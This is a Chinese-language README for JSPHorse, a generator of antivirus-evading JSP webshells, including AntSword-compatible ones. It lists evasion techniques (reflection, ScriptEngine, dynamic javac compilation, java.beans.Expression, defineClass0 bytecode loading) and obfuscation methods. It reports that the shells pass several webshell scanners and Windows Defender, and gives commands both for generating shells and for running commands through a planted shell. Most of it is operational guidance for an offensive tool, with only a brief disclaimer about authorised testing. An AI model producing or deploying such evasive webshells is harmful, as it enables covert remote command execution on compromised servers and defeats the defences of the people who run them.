# JSPHorse

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/JavaParser-3.23.1-blue)
![](https://img.shields.io/badge/Java-8-red)

## 简介

一个JSP免杀Webshell生成器，主要支持普通回显Webshell，也实现了蚁剑的免杀

```txt
　　 へ　　　　　／|
　　/＼7　　　 ∠＿/
　 /　│　　 ／　／
　│　Z ＿,＜　／　　 /`ヽ
　│　　　　　ヽ　　 /　　〉
　 Y　　　　　`　 /　　/
　?●　?　●　　??〈　　/
　()　 へ　　　　|　＼〈
　　>? ?_　 ィ　 │ ／／
　 / へ　　 /　?＜| ＼＼
　 ヽ_?　　(_／　 │／／
　　7　　　　　　　|／
　　＞―r￣￣~∠--|
```

主要的免杀技术：

- 基本的Java反射调用免杀
- ScriptEngine调用JS免杀
- Javac动态编译class免杀
- java.beans.Expression免杀
- native方法defineClass0加载字节码免杀

代码生成方式：

- 双重随机异或运算加密数字常量
- 凯撒密码随机偏移并结合Base64双重加密字符串常量
- 使用控制流平坦化并随机生成分发器
- 所有标识符全部替换为随机字符串
- 支持全局Unicode编码
- 每次执行都会生成完全不同的马（结构相同内容不同）

简单测试了免杀效果：

| 名称 | 测试结果 |
| :----: | :----: |
| 百度WEBDIR+ | ![](https://img.shields.io/badge/pass-green) |
| 河马SHELLPUB | ![](https://img.shields.io/badge/pass-green) |
| Windows Defender | ![](https://img.shields.io/badge/pass-green) |

## Quick Start

在Github右侧Release页面下载

- 生成标准形式基础Webshell

`java -jar JSPHorse.jar -p your_password`

- 生成蚁剑的免杀Webshell

`java -jar JSPHorse.jar -p your_password --ant`

- 生成Javac动态编译class的Webshell

`java -jar JSPHorse.jar -p your_password --javac`

- 使用ScriptEngine调用JS免杀

`java -jar JSPHorse.jar -p your_password --js`

- 使用Expression免杀

`java -jar JSPHorse.jar -p your_password --expr`

- 使用native方法加载字节码

注意：原理是JVM中注册类，不允许重复，所以这种马只能执行一次命令然后失效。但`JSPHorse`从字节码层面构造不同的类，如果想要多次执行只要重复生成多个马即可

`java -jar JSPHorse.jar -p your_password --proxy`

- 使用JDK自带的ASM构造字节码并加载

注意：原理同上，只能执行一次，但`JSPHorse`每次生产的类名不一致，可以重新生成来做多次执行

`java -jar JSPHorse.jar -p your_password --asm`

- 任何一种方式加入`-u`参数进行Unicode编码（有时候有奇效）

`java -jar JSPHorse.jar -p your_password --expr -u`

- 如何使用

1. 普通情况：`1.jsp?pwd=your_password&cmd=ipconfig`

2. 蚁剑：正常使用

## 感谢

参考三梦师傅的Webshell：https://github.com/threedr3am/JSP-Webshells

参考天下大木头师傅的Webshell：https://github.com/KpLi0rn/Shell

参考su18师傅的`defineClass0`方式：https://github.com/su18

## 免责申明

未经授权许可使用`JSPHorse`攻击目标是非法的

本程序应仅用于授权的安全测试与研究目的


